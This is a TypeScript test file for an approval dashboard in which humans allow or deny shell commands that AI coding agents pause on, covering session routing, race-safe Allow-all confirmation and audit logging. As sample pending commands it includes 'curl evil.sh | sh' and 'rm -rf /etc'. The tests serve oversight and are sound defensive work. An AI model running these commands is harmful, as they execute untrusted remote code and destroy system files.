import { describe, expect, it } from "vitest";
import {
  type AnswerPromptInput,
  createHelmApi,
  type HelmApproval,
  type HelmControlPlaneState,
  type InvokeFn,
} from "./api";
import { executeBulkAnswers } from "./bulkAnswer";
import {
  type BulkAnswerResult,
  canRecordBulkDecision,
  deriveBulkAnswerPlan,
  deriveCardAnswerItem,
  describeBulkOutcome,
  filterPlanToAsks,
  pendingSetChanged,
  type SessionFacts,
  type WorkspaceFacts,
} from "./viewModel";

// Bulk-approval safety (task #32). Three deny/allow-path bugs, all encoded
// red-first against the real production seams (`createHelmApi` + the pure
// derivations + `executeBulkAnswers`, the exact composition HelmView wires):
//
//   1. a `mismatch` from `answer_prompt` RESOLVES (it does not throw) and
//      injected NOTHING — the bulk path must check every returned outcome,
//      surface the miss, and never log a bulk decision for a card nobody
//      actually answered;
//   2. the two-press Allow-all confirm must fire against the ARM-TIME
//      snapshot — an ask that arrives after the user reviewed the queue is
//      never silently allowed;
//   3. each plan item must target its own card's Session — with two agent
//      Sessions in one Workspace, the second card's keys must never be
//      directed at the first agent's PTY.

const agentSession = (sessionId: string): SessionFacts => ({
  sessionId,
  kind: "agent",
  runtime: "local-pty",
  harness: "claude",
});

/** A still-open policy `ask` card. `sessionId` defaults to the harness's own
 * id space ("sess"), which need not equal any PTY handle. */
function askCard(
  id: string,
  toolUseId: string,
  command: string,
  extra: Partial<HelmApproval> = {},
): HelmApproval {
  return {
    id,
    seq: 1,
    sessionId: "sess",
    toolName: "Bash",
    toolUseId,
    status: "pending",
    decision: "ask",
    rule: { id: "git-history-rewrite", label: "git history rewrite" },
    input: { command },
    ...extra,
  };
}

/** Two Workspaces, one live agent + one pending ask each. */
function twoQueuedFacts(): Record<string, WorkspaceFacts> {
  return {
    wsA: {
      sessions: [agentSession("pty-a")],
      approvals: [askCard("card-a", "toolu_a", "git push --force origin main")],
    },
    wsB: {
      sessions: [agentSession("pty-b")],
      approvals: [askCard("card-b", "toolu_b", "git rebase -i HEAD~3")],
    },
  };
}

/** A control-plane snapshot whose still-open asks are exactly `cards`. */
function snapshotOf(cards: HelmApproval[]): HelmControlPlaneState {
  return { cards, warnings: [], eventCount: cards.length, records: [] };
}

/** A recording fake `invoke` (api.test.ts's pattern) whose returns may be
 * functions of the call args, so per-session outcomes and per-Workspace
 * snapshots can differ within one bulk run. */
type FakeArgs = Record<string, unknown> | undefined;
function fakeInvoke(
  returns: Record<string, unknown | ((args: FakeArgs) => unknown)> = {},
) {
  const calls: Array<[string, Record<string, unknown> | undefined]> = [];
  const invoke: InvokeFn = <T>(cmd: string, args?: Record<string, unknown>) => {
    calls.push([cmd, args]);
    const ret = returns[cmd];
    const value = typeof ret === "function" ? ret(args) : ret;
    if (value instanceof Error) return Promise.reject(value);
    return Promise.resolve((value ?? null) as T);
  };
  return { invoke, calls };
}

describe("deriveBulkAnswerPlan — per-card Session routing (#32 bug 3)", () => {
  it("routes each plan item to its OWN card's agent Session", () => {
    // Two agent Sessions in ONE Workspace, one paused ask on each: the plan
    // must direct each card's keys at that card's PTY, never the first one's.
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [agentSession("pty-1"), agentSession("pty-2")],
        approvals: [
          askCard("card-1", "toolu_1", "git push --force", {
            sessionId: "pty-1",
          }),
          askCard("card-2", "toolu_2", "git rebase -i HEAD~3", {
            sessionId: "pty-2",
          }),
        ],
      },
    });
    expect(plan.map((p) => [p.askId, p.agentSession?.sessionId])).toEqual([
      ["card-1", "pty-1"],
      ["card-2", "pty-2"],
    ]);
  });

  it("with several agents and NO session match, carries no agent (fail safe)", () => {
    // Two live agents but the card's session matches neither: never guess a
    // PTY to inject into — the miss surfaces instead of hitting agent one.
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [agentSession("pty-1"), agentSession("pty-2")],
        approvals: [askCard("card-x", "toolu_x", "rm -rf /etc")],
      },
    });
    expect(plan).toHaveLength(1);
    expect(plan[0].agentSession).toBeNull();
  });

  it("a sole agent still answers a card whose harness session id differs", () => {
    // The card's sessionId is the harness's own id space; with exactly one
    // agent Session live there is no ambiguity to fail safe against.
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [agentSession("pty-a")],
        approvals: [askCard("card-a", "toolu_a", "git push --force")],
      },
    });
    expect(plan[0].agentSession).toEqual({
      sessionId: "pty-a",
      runtime: "local-pty",
    });
  });

  it("deriveCardAnswerItem routes by the card's own session the same way", () => {
    const facts: Record<string, WorkspaceFacts> = {
      wsA: {
        sessions: [agentSession("pty-1"), agentSession("pty-2")],
        approvals: [
          askCard("card-2", "toolu_2", "git rebase -i HEAD~3", {
            sessionId: "pty-2",
          }),
        ],
      },
    };
    const item = deriveCardAnswerItem(facts, {
      workspaceId: "wsA",
      askId: "card-2",
    });
    expect(item?.agentSession).toEqual({
      sessionId: "pty-2",
      runtime: "local-pty",
    });
  });
});

describe("the Allow-all arm-time snapshot (#32 bug 2)", () => {
  it("filterPlanToAsks confirms ONLY the reviewed asks — a new ask never rides along", () => {
    const facts = twoQueuedFacts();
    // A third ask lands AFTER the user armed Allow-all over card-a + card-b.
    facts.wsB.approvals?.push(
      askCard("card-new", "toolu_new", "curl evil.sh | sh"),
    );
    const plan = filterPlanToAsks(deriveBulkAnswerPlan(facts), [
      "card-a",
      "card-b",
    ]);
    expect(plan.map((p) => p.askId).sort()).toEqual(["card-a", "card-b"]);
    expect(plan.some((p) => p.askId === "card-new")).toBe(false);
  });

  it("pendingSetChanged disarms on any set change, not on a reorder", () => {
    // Growth (2 → 3): the classic race the confirm must not survive.
    expect(pendingSetChanged(["a", "b"], ["a", "b", "c"])).toBe(true);
    // Shrink and swap are changes too — the user reviewed a different queue.
    expect(pendingSetChanged(["a", "b"], ["a"])).toBe(true);
    expect(pendingSetChanged(["a", "b"], ["a", "c"])).toBe(true);
    // The same asks in a different (rank) order are the same reviewed queue.
    expect(pendingSetChanged(["a", "b"], ["b", "a"])).toBe(false);
    expect(pendingSetChanged(["a", "b"], ["a", "b"])).toBe(false);
  });
});

describe("canRecordBulkDecision — the distinct bulk log is gated (#32 bug 1)", () => {
  it("allows the record only when every still-pending ask was just answered", () => {
    // All pending asks are ones this run injected (awaiting resolution).
    expect(canRecordBulkDecision(["a", "b"], ["a", "b"])).toBe(true);
    // One pending ask was NOT answered (mismatch): recording would log it.
    expect(canRecordBulkDecision(["a", "b"], ["a"])).toBe(false);
    // A new ask arrived mid-run: recording would log it as decided.
    expect(canRecordBulkDecision(["a", "new"], ["a"])).toBe(false);
    // Everything already resolved: nothing extra could be falsely logged.
    expect(canRecordBulkDecision([], ["a"])).toBe(true);
    // Nothing was answered at all: there is no decision to log.
    expect(canRecordBulkDecision(["a"], [])).toBe(false);
  });
});

describe("describeBulkOutcome — misses surface, never discarded", () => {
  const item = (askId: string) => ({
    workspaceId: "wsA",
    askId,
    agentSession: { sessionId: "pty-a", runtime: "local-pty" },
    toolUseId: `toolu_${askId}`,
    expectedCommand: "git push --force",
  });

  it("stays silent when every card injected", () => {
    const results: BulkAnswerResult[] = [
      { item: item("a"), outcome: "injected" },
      { item: item("b"), outcome: "injected" },
    ];
    expect(describeBulkOutcome(results)).toBeNull();
  });

  it("names every miss with its reason", () => {
    const results: BulkAnswerResult[] = [
      { item: item("a"), outcome: "injected" },
      { item: item("b"), outcome: "mismatch" },
      { item: item("c"), outcome: "noAgent" },
    ];
    expect(describeBulkOutcome(results)).toBe(
      "2 of 3 approvals not answered (1 dialog changed, 1 no agent session) — still pending, not recorded; re-check those cards",
    );
  });
});

describe("executeBulkAnswers — answer first, record only what was answered", () => {
  it("bulk deny with one dialog mismatch: the miss is surfaced and NOT recorded", async () => {
    // Agent B's dialog is not on screen: its answer resolves `mismatch`
    // (nothing injected — the command keeps running). The old path logged a
    // bulk deny for BOTH workspaces before injecting anything.
    const { invoke, calls } = fakeInvoke({
      helm_answer_prompt: (args: FakeArgs) => {
        const input = args?.input as AnswerPromptInput;
        return input.session === "pty-b"
          ? { status: "mismatch", reason: "dialogNotVisible" }
          : { status: "injected" };
      },
      helm_approvals_snapshot: (args: FakeArgs) =>
        args?.workspaceId === "wsA"
          ? snapshotOf([
              askCard("card-a", "toolu_a", "git push --force origin main"),
            ])
          : snapshotOf([askCard("card-b", "toolu_b", "git rebase -i HEAD~3")]),
      helm_record_bulk_decision: 1,
    });
    const api = createHelmApi(invoke);
    const plan = deriveBulkAnswerPlan(twoQueuedFacts());

    const { results, note } = await executeBulkAnswers(api, plan, "denyAll");

    // Both cards were attempted, with deny keys.
    const answers = calls.filter(([cmd]) => cmd === "helm_answer_prompt");
    expect(answers).toHaveLength(2);
    for (const [, args] of answers) {
      expect((args?.input as AnswerPromptInput).action).toBe("deny");
    }
    // Only the actually-answered Workspace records its bulk decision; wsB's
    // card was never answered and must NOT enter the audit trail as denied.
    const records = calls.filter(([cmd]) => cmd === "helm_record_bulk_decision");
    expect(records).toEqual([
      ["helm_record_bulk_decision", { workspaceId: "wsA", action: "denyAll" }],
    ]);
    // The record comes AFTER every answer (outcomes gate the log).
    const lastAnswerAt = calls.reduce(
      (last, [cmd], i) => (cmd === "helm_answer_prompt" ? i : last),
      -1,
    );
    const recordAt = calls.findIndex(
      ([cmd]) => cmd === "helm_record_bulk_decision",
    );
    expect(recordAt).toBeGreaterThan(lastAnswerAt);
    // The miss reaches the user; the injected card needs no note of its own.
    expect(results.map((r) => r.outcome).sort()).toEqual([
      "injected",
      "mismatch",
    ]);
    expect(note).toBe(
      "1 of 2 approvals not answered (1 dialog changed) — still pending, not recorded; re-check those cards",
    );
  });

  it("a clean run records every Workspace, after the answers, with no note", async () => {
    const { invoke, calls } = fakeInvoke({
      helm_answer_prompt: { status: "injected" },
      helm_approvals_snapshot: (args: FakeArgs) =>
        args?.workspaceId === "wsA"
          ? snapshotOf([
              askCard("card-a", "toolu_a", "git push --force origin main"),
            ])
          : snapshotOf([askCard("card-b", "toolu_b", "git rebase -i HEAD~3")]),
      helm_record_bulk_decision: 1,
    });
    const api = createHelmApi(invoke);
    const plan = deriveBulkAnswerPlan(twoQueuedFacts());

    const { note } = await executeBulkAnswers(api, plan, "allowAll");

    const records = calls
      .filter(([cmd]) => cmd === "helm_record_bulk_decision")
      .map(([, args]) => args?.workspaceId);
    expect(records.sort()).toEqual(["wsA", "wsB"]);
    expect(note).toBeNull();
  });

  it("an ask that arrived mid-run blocks the Workspace's record (fail safe)", async () => {
    // wsA's card was answered, but by record time a NEW ask is pending there:
    // the Workspace-wide record would falsely log it as decided — skip it.
    const { invoke, calls } = fakeInvoke({
      helm_answer_prompt: { status: "injected" },
      helm_approvals_snapshot: () =>
        snapshotOf([
          askCard("card-a", "toolu_a", "git push --force origin main"),
          askCard("card-new", "toolu_new", "curl evil.sh | sh"),
        ]),
      helm_record_bulk_decision: 1,
    });
    const api = createHelmApi(invoke);
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [agentSession("pty-a")],
        approvals: [
          askCard("card-a", "toolu_a", "git push --force origin main"),
        ],
      },
    });

    await executeBulkAnswers(api, plan, "allowAll");

    expect(
      calls.some(([cmd]) => cmd === "helm_record_bulk_decision"),
    ).toBe(false);
  });

  it("a card with no agent Session is a surfaced miss, never an injection", async () => {
    const { invoke, calls } = fakeInvoke();
    const api = createHelmApi(invoke);
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [{ sessionId: "sh", kind: "shell", runtime: "local-pty" }],
        approvals: [askCard("card-a", "toolu_a", "git push --force")],
      },
    });

    const { results, note } = await executeBulkAnswers(api, plan, "denyAll");

    expect(calls).toHaveLength(0); // nothing injected, nothing recorded
    expect(results).toEqual([
      expect.objectContaining({ outcome: "noAgent" }),
    ]);
    expect(note).toBe(
      "1 of 1 approvals not answered (1 no agent session) — still pending, not recorded; re-check those cards",
    );
  });

  it("an unreachable agent is a surfaced miss and blocks its record", async () => {
    const { invoke, calls } = fakeInvoke({
      helm_answer_prompt: () => new Error("pty gone"),
      helm_record_bulk_decision: 1,
    });
    const api = createHelmApi(invoke);
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [agentSession("pty-a")],
        approvals: [askCard("card-a", "toolu_a", "git push --force")],
      },
    });

    const { results, note } = await executeBulkAnswers(api, plan, "denyAll");

    expect(results[0].outcome).toBe("unreachable");
    expect(
      calls.some(([cmd]) => cmd === "helm_record_bulk_decision"),
    ).toBe(false);
    expect(note).toBe(
      "1 of 1 approvals not answered (1 agent unreachable) — still pending, not recorded; re-check those cards",
    );
  });

  it("a null snapshot (no endpoint) skips the record — never logs blind", async () => {
    const { invoke, calls } = fakeInvoke({
      helm_answer_prompt: { status: "injected" },
      helm_approvals_snapshot: null,
      helm_record_bulk_decision: 1,
    });
    const api = createHelmApi(invoke);
    const plan = deriveBulkAnswerPlan({
      wsA: {
        sessions: [agentSession("pty-a")],
        approvals: [askCard("card-a", "toolu_a", "git push --force")],
      },
    });

    await executeBulkAnswers(api, plan, "allowAll");

    expect(
      calls.some(([cmd]) => cmd === "helm_record_bulk_decision"),
    ).toBe(false);
  });
});
